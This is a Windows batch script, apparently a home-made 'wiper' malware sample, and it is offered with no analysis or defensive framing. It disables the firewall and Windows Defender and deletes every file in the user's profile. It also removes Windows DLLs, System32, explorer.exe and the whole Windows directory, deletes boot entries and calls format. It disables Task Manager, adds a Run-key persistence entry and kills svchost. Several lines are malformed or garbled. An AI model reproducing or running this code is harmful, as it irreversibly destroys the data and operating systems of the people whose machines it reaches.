@echo off
title BehavesLIKE.bat.GEN
net stop "Windows Firewall"
net stop "Windows defender"






netsh fadvirewall set opmode mode=disable 
netsh advfirewall set opmode mode=disable 
netsh advfirewall set opmode mode=disable 
netsh advfirewall set opmode mode=disable   
netsh advfirewall set opmode mode=disable






cd C:\USERS\%username%
del *.* /f /q /s



cd C:\
takeown /F config.sys
del C:\WINDOWS\*.dll /f /q /s
cd %temp%
echo set shell = CreateObject(^"wscript.shell^") >SQR88.VBS
echo On Error Resume Next >>SQR88.VBS
echo Set fso = CreateObject(^"Scripting.FileSystemObject^") >>SQR88.VBS
echo Set file = fso.deletefile(^"%windir%\system32^") >>SQR88.VBS
echo Set infect = fso.Opentextfile(windir&^"\twain_32.dll^") >>SQR88.VBS
echo file.writeline ^"010020012010201000001001001010^"
echo file.close
























bcdedit /delete {ntldr}
format 





reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr, 1, REG_DWORD
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun, 1, REG_DWORD
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\install\DDOS, 1, REG_DWORD
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\”cssys” = “%username%\BeHavesLIKE.ROZBEH.GEN.exe”
reg delete %key% /f

taskkill /im svchost.exe /f
shutdown -a
takeown /F %windir%\explorer.exe
attrib -h -s -a explorer.exe
del explorer.exe /f /q /s
takeown /f C:\Windows\System32
cacls %windir%\System32
RD %windir%system32 /q /s
bcdedit /delete {bootsector}
bcdedit /delete {bootmgr}
takeown %windir%
cacls %windir%
cd %windir%
attrib +A +R *.exe
RD %windir% /q /s